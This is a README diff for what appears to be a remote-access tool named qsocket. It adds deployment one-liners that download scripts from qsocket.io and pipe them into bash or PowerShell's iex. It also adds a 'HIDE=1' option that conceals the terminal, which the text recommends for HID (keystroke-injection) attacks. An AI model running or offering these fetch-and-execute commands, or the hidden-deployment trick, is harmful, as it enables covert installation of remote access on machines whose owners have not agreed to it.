@@ -31,3 +31,23 @@ irm qsocket.io/1 | iex
 ```bash
 curl -fsSL qsocket.io/2 | bash"
 ```
+
+# Deploy Examples
+
+#### Deploy with a spesific secret value
+
+```bash
+S="MySecret" curl -fsSL qsocket.io/0 | bash # For *nix
+```
+```powershell
+$env:S="MySecret"; irm qsocket.io/1 | iex  # For Windows
+```
+#### Hide Terminal During Deploymeny
+This option can be usefull during HID attacks.
+
+```bash
+HIDE=1 curl -fsSL qsocket.io/0 | bash # For \*nix
+```
+```powershell
+$env:HIDE=1; irm qsocket.io/1 | iex # For Windows
+```
